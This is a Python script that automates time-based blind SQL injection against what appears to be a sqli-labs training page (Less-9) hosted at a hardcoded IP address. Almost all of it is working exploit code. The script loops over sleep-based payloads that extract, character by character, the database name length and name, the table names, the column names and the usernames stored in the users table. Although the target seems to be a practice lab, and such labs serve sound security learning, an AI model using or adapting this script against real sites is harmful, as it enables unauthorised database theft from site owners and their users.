#! /usr/bin/env python3
# coding=utf-8
# __author__: leezp
# __date__: 2019-09-09
import requests


# 盲注(时间型)
# substr,ascii,if
# sql注入爆数据库名长度，库名，表名，字段名
# ascii 表 https://baike.baidu.com/item/ASCII/309296?fr=aladdin
# mysql 数据库命名规则
# 创建一个有特殊字符的数据库：mysql> CREATE DATABASE `!@#$%^&*()_`;
# 所以我的脚本数据库名字典有待扩充，考虑到延迟注入的效率，暂时未添加。

def database_len():
    for i in range(0, 20):
        url = '''http://49.232.6.24/sqli-labs-master/Less-9/index.php'''
        payload = '''?id=1' and if(length(database())>%s,sleep(0),sleep(2))''' % i
        # print(url+payload+'%23')
        r = requests.get(url + payload + '%23')
        if not r.elapsed.total_seconds() < 2:
            print('database_length:', i)
            break
        else:
            pass


def database_name():
    name = ''
    flag = False
    for j in range(1, 20):
        if flag:
            break
        flag = True
        for i in 'sqcwertyuioplkjhgfdazxvbnm_':
            url = "http://49.232.6.24/sqli-labs-master/Less-9/index.php?id=1' and if(substr(database(),%d,1)='%s',sleep(0),sleep(1))" % (
                j, i)
            # print(url + '%23')
            r = requests.get(url + '%23')
            if r.elapsed.total_seconds() < 1:
                flag = False
                name = name + i
                print(name)
                break
    print('database_name:', name)


def table_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                url = "http://49.232.6.24/sqli-labs-master/Less-9/index.php?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%s',sleep(0),sleep(0.5))" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if r.elapsed.total_seconds() < 0.5:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('table_name:', name)


def column_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                url = "http://49.232.6.24/sqli-labs-master/Less-9/index.php?id=1' and if(substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit %d,1),%d,1)='%s',sleep(0),sleep(0.5))" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if r.elapsed.total_seconds() < 0.5:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('column_name:', name)


def field_name():
    switch = False
    for k in range(0, 19):
        if switch:
            break
        switch = True
        name = ''
        flag = False
        for j in range(1, 20):
            if flag:
                break
            flag = True
            for i in 'sqcwertyuioplkjhgfdazxvbnm_1234567890':
                url = "http://49.232.6.24/sqli-labs-master/Less-9/index.php?id=1' and if(substr((select username from security.users  limit %d,1),%d,1)='%s',sleep(0),sleep(0.5))" % (
                    k, j, i)
                # print(url + '%23')
                r = requests.get(url + '%23')
                if r.elapsed.total_seconds() < 0.5:
                    flag = False
                    switch = False
                    name = name + i
                    print(name)
                    break
        print('field_name:', name)


database_len()
database_name()
table_name()
column_name()
field_name()
